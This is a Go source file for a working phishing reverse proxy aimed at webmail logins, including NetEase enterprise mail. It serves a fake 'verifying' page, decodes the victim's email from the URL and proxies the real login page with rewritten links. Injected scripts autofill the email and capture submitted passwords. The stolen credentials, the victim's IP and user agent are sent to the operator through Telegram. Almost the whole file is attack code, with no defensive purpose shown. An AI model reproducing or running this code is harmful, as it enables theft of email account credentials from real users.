package main

import (
	"crypto/tls"
	"encoding/base64"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
)

type SessionStore struct {
	mu       sync.RWMutex
	sessions map[string]*SessionData
}

type SessionData struct {
	Cookies   map[string]string
	UserEmail string
}

var store = &SessionStore{
	sessions: make(map[string]*SessionData),
}

const harvesterScript = `
<script>
// Polyfill
const OriginalURL = window.URL;
window.URL = function(url, base) {
    try { return new OriginalURL(url, base || window.location.origin); } 
    catch (e) {
        if (typeof url === 'string' && !url.startsWith('http')) {
            return new OriginalURL('https://' + window.location.hostname + '/' + url.replace(/^\/+/, ''));
        }
        return new OriginalURL('https://' + window.location.hostname + '/');
    }
};
window.URL.prototype = OriginalURL.prototype;

// Auto-harvest email
setTimeout(function() {
    var email = window._targetEmail;
    if (email) {
        fetch('/api/harvest', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'type=email_only&email=' + encodeURIComponent(email)
        }).catch(() => {});
    }
}, 500);

// Auto-fill inside the iframe
setInterval(function() {
    try {
        var iframe = document.getElementById('proxy-frame');
        if (iframe && iframe.contentWindow && iframe.contentWindow.document) {
            var doc = iframe.contentWindow.document;
            var email = window._targetEmail;
            
            if (email) {
                var inputs = doc.querySelectorAll('input[type="text"], input[type="email"], input[name="username"], input[name="email"]');
                if (inputs.length > 0 && inputs[0].value === "") {
                    let setter = Object.getOwnPropertyDescriptor(iframe.contentWindow.HTMLInputElement.prototype, "value").set;
                    setter.call(inputs[0], email);
                    inputs[0].dispatchEvent(new Event('input', { bubbles: true }));
                    inputs[0].dispatchEvent(new Event('change', { bubbles: true }));
                    inputs[0].focus();
                }
            }

            // Inject interceptors to catch the password when they click login
            if (!iframe.contentWindow._intercepted) {
                iframe.contentWindow._intercepted = true;
                iframe.contentWindow.document.addEventListener('submit', function(e) {
                    const form = e.target;
                    const formData = new FormData(form);
                    const params = new URLSearchParams();
                    let hasEmail = false;
                    let hasPassword = false;
                    for (let [key, value] of formData.entries()) {
                        params.append(key, value);
                        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account')) hasEmail = true;
                        if (key.toLowerCase().includes('pass')) hasPassword = true;
                    }
                    if (hasEmail && hasPassword) {
                        fetch('/api/harvest', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                            body: params.toString() + '&type=login'
                        }).catch(() => {});
                    }
                }, true);
            }
        }
    } catch(e) {} // Ignore cross-origin errors until the page is fully loaded
}, 1000);
</script>
`

const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style>body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;font-family:Arial;}.spin{border:4px solid #f3f3f3;border-top:4px solid #4285F4;border-radius:50%;width:40px;height:40px;animation:s 1s linear infinite;margin:0 auto 20px;}@keyframes s{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head><body><div id="loader" style="text-align:center;background:white;padding:40px;border-radius:10px;"><div class="spin"></div><p>Verifying secure connection...</p></div><script>
setTimeout(()=>{
    var hash = window.location.hash;
    var email = "";
    
    if (hash && hash.length > 1) {
        var raw = hash.substring(1); 

        if (raw.startsWith('t=')) {
            var b64 = raw.split('t=')[1];
            try { email = atob(b64); } catch(e) { email = b64; }
        } else {
            if (raw.includes('[[-Email-]]')) { email = raw.replace('[[-Email-]]', 'test@126.com'); } 
            else if (raw.includes('[[-email-]]')) { email = raw.replace('[[-email-]]', 'test@126.com'); }
            else { email = raw; }
            
            var b64Email = btoa(email);
            window.history.replaceState({}, '', '/#?t=' + b64Email);
        }

        window._targetEmail = email;
        
        fetch('/api/fetch?email=' + encodeURIComponent(email))
            .then(r => r.text())
            .then(html => {
                document.open();
                document.write(html);
                document.close();
            });
    } else {
        document.body.innerHTML = "<h3>No account provided.</h3>";
    }
}, 1000);
</script></body></html>`

func StartProxy(cfg TelegramConfig, listenPort string) {
	r := gin.Default()

	r.GET("/", func(c *gin.Context) {
		c.Header("Content-Type", "text/html")
		c.String(200, loaderHTML)
	})

	r.NoRoute(func(c *gin.Context) {
		c.Header("Content-Type", "text/html")
		c.String(200, loaderHTML)
	})

	// Fetches the raw HTML and forces UTF-8
	r.GET("/api/fetch", func(c *gin.Context) {
		email := c.Query("email")
		if b64, err := base64.StdEncoding.DecodeString(email); err == nil && strings.Contains(string(b64), "@") {
			email = string(b64)
		}

		targetBase := GetTargetDomain(email)

		jar, _ := cookiejar.New(nil)
		proxyClient := &http.Client{
			Timeout: 15 * time.Second,
			Jar:     jar,
			Transport: &http.Transport{
				ForceAttemptHTTP2: false,
				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
			},
		}

		req, _ := http.NewRequest("GET", targetBase, nil)
		req.Header.Set("Accept-Encoding", "identity")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

		resp, err := proxyClient.Do(req)
		if err != nil {
			c.String(502, "Error: %v", err)
			return
		}
		defer resp.Body.Close()

		bodyBytes, _ := io.ReadAll(resp.Body)
		bodyStr := string(bodyBytes)

		// FIX: Instead of regex, we aggressively strip ALL charset declarations and force UTF-8.
		bodyStr = strings.ReplaceAll(bodyStr, "charset=gbk", "charset=utf-8")
		bodyStr = strings.ReplaceAll(bodyStr, "charset=\"gbk\"", "charset=\"utf-8\"")
		bodyStr = strings.ReplaceAll(bodyStr, "charset='gbk'", "charset='utf-8'")

		// Rewrite URLs to go through our proxy
		bodyStr = strings.ReplaceAll(bodyStr, targetBase, c.Request.Host+"/proxy/")
		if strings.Contains(email, "@") {
			domain := strings.Split(email, "@")[1]
			bodyStr = strings.ReplaceAll(bodyStr, "https://"+domain, c.Request.Host+"/proxy/")
			bodyStr = strings.ReplaceAll(bodyStr, "http://"+domain, c.Request.Host+"/proxy/")
		}

		// Inject our email script
		emailScript := `<script>window._targetEmail = "` + email + `";</script>`
		bodyStr = strings.Replace(bodyStr, "<head>", "<head>\n"+emailScript, 1)

		c.Header("Content-Type", "text/html; charset=utf-8")
		c.Header("Access-Control-Allow-Origin", "*")
		c.String(resp.StatusCode, bodyStr)
	})

	r.POST("/api/harvest", func(c *gin.Context) {
		c.Request.ParseForm()
		email := c.PostForm("email")
		password := c.PostForm("password")
		harvestType := c.PostForm("type")

		if email == "" {
			email = c.PostForm("username")
		}
		if password == "" {
			password = c.PostForm("passwd")
		}
		if password == "" {
			password = c.PostForm("pwd")
		}

		ip := c.ClientIP()
		ua := c.GetHeader("User-Agent")

		if harvestType == "email_only" {
			SendTelegramMessage(cfg, FormatLoginAlert(email, "[Waiting for password...]", ip, ua))
		} else {
			SendTelegramMessage(cfg, FormatLoginAlert(email, password, ip, ua))
		}

		c.JSON(200, gin.H{"status": "ok"})
	})

	// Proxies the static files (images, CSS, JS) safely
	r.Any("/proxy/*filepath", func(c *gin.Context) {
		filepath := strings.TrimPrefix(c.Param("filepath"), "/")
		targetDomain := "https://mail.qiye.163.com/"

		fullURL := targetDomain + filepath

		outReq, _ := http.NewRequest(c.Request.Method, fullURL, c.Request.Body)
		for k, v := range c.Request.Header {
			for _, val := range v {
				outReq.Header.Add(k, val)
			}
		}

		client := &http.Client{
			Timeout:   15 * time.Second,
			Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
		}

		resp, err := client.Do(outReq)
		if err == nil {
			defer resp.Body.Close()
			for k, v := range resp.Header {
				for _, val := range v {
					c.Writer.Header().Add(k, val)
				}
			}
			c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
			c.Writer.WriteHeader(resp.StatusCode)
			io.Copy(c.Writer, resp.Body)
		} else {
			c.String(502, "Upstream Error")
		}
	})

	log.Printf("🚀 Chameleon Proxy listening on 0.0.0.0:%s", listenPort)
	r.Run("0.0.0.0:" + listenPort)
}
